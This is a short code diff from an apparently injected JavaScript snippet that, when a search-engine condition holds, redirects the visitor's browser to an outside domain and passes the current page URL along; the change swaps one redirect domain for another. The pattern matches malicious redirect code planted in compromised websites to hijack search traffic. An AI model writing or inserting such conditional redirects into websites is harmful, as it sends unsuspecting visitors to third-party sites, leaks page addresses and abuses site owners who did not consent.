@@ -7,6 +7,6 @@
       if(is_se)
     	{
     		var url = window.location.href;
-    		window.location = "https://flooring.my.id/?arsae="+ encodeURIComponent(url);
+    		window.location = "https://indralokanews.com/?arsae="+ encodeURIComponent(url);
     	}
     }
